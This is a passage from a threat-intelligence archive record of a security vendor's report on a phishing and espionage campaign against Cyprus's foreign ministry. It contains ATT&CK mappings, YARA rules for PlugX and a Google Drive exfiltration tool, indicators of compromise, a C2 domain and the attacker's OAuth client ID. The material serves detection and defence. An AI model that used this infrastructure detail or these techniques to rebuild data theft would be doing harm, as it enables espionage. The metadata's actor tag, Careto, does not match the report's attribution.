send\\superobject.pas.”\n\nFinally, below is the actor’s OAuth2 configuration file, named RefreshToken.ini. The ClientID is a unique identifier\n\nfor the Google account whose Google Drive acts as a cloud storage for data exfiltration. Also included in the file are\n\nthe ClientSecret and RefreshToken used for authentication to the Google account. Please note, ClientSecret and\n\nRefreshToken were hashed with SHA1 by Area 1 Security to allow researchers to match them in the event that an\n\nongoing investigation would be aided by this information.\n\n**RefreshToken.ini**\n\n**[General]**\n**ClientID=205408245657-eg0r569euk8qef5nkab52b01cl5i3nn5.apps.googleusercontent.com**\n**ClientSecret=**d6e884fb2021f7852a68b84ddedd7e3764f4f1d7****\n**RefreshToken=**46836a597b3213683986d68c2a7df6027fd4e1f1****\n\n|tID=205408245657-eg0r569euk8qef5nkab52b01cl5i3nn5.a|pps.googleusercontent.com|\n|---|---|\n\n\n-----\n\n## Tactics, Techniques,\n and Procedures (TTPs)\n\nArea 1 Security mapped SSF’s TTPs to the appropriate MITRE ATT&CK matrix as detailed below.\n\n|ATT&CK TACTIC REFERENCE|Col2|\n|---|---|\n|Spear phishing messages with malicious links|T1369 Spear Phishing with Links|\n|Spear phishing messages with malicious attachments|T1367 Spear Phishing with Attachments|\n|Browsing target web sites from C2 servers|TA0015 Technical Information Gathering|\n|Dynamic DNS domains used for C2|TA0022 Establish & Maintain Infrastructure|\n|Parking domains at localhost 127.0.0.1 during periodic dormancy in active operations|TA0021 Adversary OPSEC|\n|Periodically turning the C2s on and off to conduct surveys to collect victim information and check their persistence in victim organizations (Maintenance Mode)|T1119 Automated Collection|\n|Leverage reverse shells to laterally spread RAR SFX archives with PlugX implant on multiple victim hosts|T1105 Remote File Copy|\n|Maintain a large implant presence across many victim hosts in the same organization|TA0014 Target Selection|\n|Moving data locally on host to staging directory|T1074 Data Staged|\n|Systematically collect and gather large amounts of data from Desktop/Documents/Downloads folders|T1005 Data from Local System|\n|Dump and pass hashes/passwords using WCE|T1003 Credential Dumping|\n|Use of encryption in malware implants|T1079 Multilayer Encryption|\n|Use of a Google cloud tool bundled with OpenSSL libraries to exfiltrate data to cloud resources|T1022 Data Encrypted|\n|Renaming or deleting tools after use|T1107 File Deletion|\n|Targeting or exfiltrating data preceding state official visits|TA0012 Priority Definition Planning|\n|Attack campaigns ending prior to diplomats/politicians meeting with Chinese officials|TA0013 Priority Definition Direction|\n|Password protected RAR archives for data exfiltration|T1022 Data Encrypted|\n\n\n-----\n\n## Detections and Mitigations\n\n**plugx.dll**\n\n**rule Area1_SSF_PlugX {**\n**strings:**\n**$feature_call = { 8b 0? 56 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 6a 07 6a**\n**ff ff d0 8b f0 85 f6 74 14 }**\n**$keylogger_reg = { 8b 4d 08 6a 0c 6a 01 8d 55 f4 52 c7 45 f4 01 00 06 00 c7 45 f8**\n**00 01 00 00 89 4d fc ff d0 85 c0 75 1d }**\n**$file_op = { 55 8b ec 83 ec 20 0f b7 56 18 8b 46 10 66 8b 4e 14 89 45 e4 8d 44 32**\n**10 66 89 4d f0 0f b7 4e 1a 57 89 45 e8 33 ff 8d 45 e0 8d 54 31 10 50 89 7d e0 89 55**\n**ec c7 45 fa ?? ?? ?? ?? 89 7d f2 89 7d f6 ff 15 1c 43 02 10 }**\n**$ver_cmp = { 0f b6 8d b0 fe ff ff 0f b6 95 b4 fe ff ff 66 c1 e1 08 0f b7 c1 0b c2**\n**3d 02 05 00 00 7f 2c }**\n**$regedit = { c7 06 23 01 12 20 c7 46 04 01 90 00 00 89 5e 0c 89 5e 08 e8 51 fb ff**\n**ff 8b 4d 08 8b 50 38 68 30 75 00 00 56 51 ff d2 }**\n**$get_device_caps = { 8b 1d ?? ?? ?? ?? 6a 08 50 ff d3 0f b7 56 12 8b c8 0f af ca**\n**b8 1f 85 eb 51 f7 e9 c1 fa 05 8b c2 c1 e8 1f 03 c2 89 45 f8 8b 45 f0 6a 0a 50 ff d3**\n**0f b7 56 14 8b c8 0f af ca b8 1f 85 eb 51 }**\n**condition:**\n**3 of them**\n**}**\n\n**send.exe**\n\n**rule Area1_SSF_GoogleSend_Strings {**\n**strings:**\n**$conf = “RefreshToken.ini” wide**\n**$client_id = “Enter your client ID here” wide**\n**$client_secret = “Enter your client secret here” wide**\n**$status = “We are going to send” wide**\n**$s1 = { b8 00 01 00 00 f0 0f b0 23 74 94 f3 90 80 3d ?? ?? ?? ?? 00 75 ?? 51 52**\n**6a 00 e8 ?? ?? ?? ?? 5a 59 b8 00 01 00 00 f0 0f b0**\n**23 0f ?? ?? ?? ?? ?? 51 52 6a 0a e8 ?? ?? ?? ?? 5a 59 eb c3 }**\n**condition:**\n**uint16(0) == 0x5a4d and all of them**\n**}**\n\n\n-----\n\n## Indicators\n\n### NVSMARTMAX.DLL (PLUGX LOADER)\n\n**SHA-256 Hashes:** f6c42bc2220fd864ed475b712d2d239ef133a2960f84ecdb419acceac4ebe3\n\n**SHA-1 Hashes:** dce0f3d5a537b722efaa0f4f6f817e1b5b97248b\n\n**MD5 Hashes:** 1d8f21039c629d08c65e9766691483fd  | Nv.mp3 (PlugX Encrypted Payload)\n\n**SHA-256 Hashes: 73d016ca6988bbb854f294adb1f11e3fb7bc90222085fbd95fe0723aaa4428**\n\n**SHA-1 Hashes:ed8b0b999b516b2488991f763894199e7a1447d7**\n\n**MD5 Hashes:cba2271cc819101718a9460886ae47c2**\n\n**Command and Control Address:updates.organiccrap[.]com**\n\n### PLUGX PAYLOAD\n\n**SHA-256 Hashes:** c1c80e237f6fbc2c61b82c3325dd836f3849ca036a28007617e4e27ba2f16c4b\n\n**SHA-1 Hashes:** 88222c4fe9b9af8300b135229ad7b3303c299aab\n\n**MD5 Hashes:** 2ca739538e18ce6f881694d99f6e22e9\n\n### SEND.EXE\n\n**SHA-256 Hashes:** b65c57a380a1df69e61462e814575bf93a8ea5772621c1f19ccfff5bdd6a3e8f\n\n**SHA-1 Hashes:** ccfa460974d270e26688de917811cc483035e09e\n\n**MD5 Hashes:232c85f65de1ef2cab812f01f3761d49**\n\n**Exfiltration Address:** 205408245657-eg0r569euk8qef5nkab52b01cl5i3nn5.apps.googleusercontent.com\n\n|L|UG|\n|---|---|\n\n|LO|A|D|E|R)|\n|---|---|---|---|---|\n\n\n-----\n\n## Cables\n\nArea 1 Security observed the SSF collecting thousands of diplomatic cables from the network of\n\nthe Ministry of Foreign Affairs of Cyprus. Below is a table of the subjects the cables covered.\n\n|ACRONYM|COUNCIL WORKING PARTY|ACRONYM|COUNCIL WORKING PARTY|\n|---|---|---|---|\n|COACD|Criminal Appeal Court|COMED|Euro-Med Partnership|\n|COAFR|Africa Working Party|COMEM|Middle East/Gulf|\n|COARM|Exports of Conventional|COMEP|Middle East Peace|\n|COASI|Asia-Oceania Working Party|COMET|Restrictive Measures to Combat Terrorism|\n|COCON|Consular Affairs|COMIN|Foreign Affairs Ministers|\n|COCOP|Common Position|CONOP|NonProliferation|\n|CODEV|Development Cooperation|CONUN|United Nations|\n|CODIV|Enhanced Wireless Communication Systems Employing COoperative DIVersity|COPAR|Joint Committee|\n|CODNL|Denial Notification|COPOL|Political and Security Committee|\n|CODUD|Dual-Use Goods|COPRO|Protocol|\n|CODUN|Global Disarmament and Arms Control|CORLX|Council Regulation|\n|COELA|Enlargement and Countries|COSCE|OSCE and the Council of Europe|\n|COEST|Eastern Europe and Central Asia|COSDP|Security and Defense Policy|\n|COEUR|European Council|COSEC|Security|\n|COHOM|Human Rights|COSEE|South East Europe|\n|COHUM|Humanitarian Questions|COTEL|Telecommunications|\n|COJUR|Public International Law|COTER|Terrorism|\n|COLAC|Latin America|COTRA|Transatlantic Relations|\n|COMAG|Mashrek/Maghreb|COWEB|Western Balkans|\n|COMAR|Law of the Sea|||\n\n\n-----\n\n## About Area 1 Security\n\nArea 1 Security is the first to bring accountability to cybersecurity. Backed by top-tier\n\ninvestors, Area 1 Security is led by security, Artificial Intelligence, and data analytics experts\n\nwho created a preemptive solution to stop phishing, the number one cause of cyber attacks.\n\nArea 1 Security works with organizations worldwide, including Fortune 500 banks, insurance,\n\nand tech companies, and healthcare providers to realign their cybersecurity posture for\n\ncombating the most significant risks, protecting customer data, and stopping attacks before\n\nthey happen. Area 1 Security is a recipient of Inc. Magazine’s “2018 Inc.’s Best Workplaces”\n\n[in America. To learn more about Area 1 Security, visit www.area1security.com, join the](http://www.area1security.com)\n\n[conversation at @area1security or follow the blog for the latest industry news and insights](https://twitter.com/area1security)\n\non how to stop phishing.\n\n**[Learn More INFO@AREA1SECURITY.COM](http://info@area1security.com)**\n\n\n**/**\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "5910e58f-4bc9-4e4e-9dbb-887804094a01",
            "created_at": "2022-10-25T16:32:58.457399Z",
            "updated_at": "2022-10-25T16:32:58.457399Z",
            "deleted_at": null,
            "name": "OTX",
            "url": "https://otx.alienvault.com",
            "description": "Alienvault Open Threat Exchange (OTX)",
            "reports": null
        }
    ],
    "references": [
        "https://cdn.area1security.com/reports/Area-1-Security-PhishingDiplomacy.pdf"
    ],
    "report_names": [
        "Area-1-Security-PhishingDiplomacy.pdf"
    ],
    "threat_actors": [
        {
            "id": "67bf0462-41a3-4da5-b876-187e9ef7c375",
            "created_at": "2022-10-25T16:07:23.44832Z",
            "updated_at": "2025-03-27T02:02:09.806007Z",
            "deleted_at": null,
            "main_name": "Careto",
            "aliases": [
                "Careto",
                "The Mask",
                "Ugly Face"
            ],
            "source_name": "ETDA:Careto",
            "tools": [
                "Careto"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1666716496,
    "ts_updated_at": 1743041174,
    "ts_creation_date": 1545215246,
    "ts_modification_date": 1545215248,
    "files": {
        "pdf": "https://archive.orkl.eu/4b1c1e491e3ef07b114564f0580c841ca8c70e24.pdf",
        "text": "https://archive.orkl.eu/4b1c1e491e3ef07b114564f0580c841ca8c70e24.txt",
        "img": "https://archive.orkl.eu/4b1c1e491e3ef07b114564f0580c841ca8c70e24.jpg"
    }
}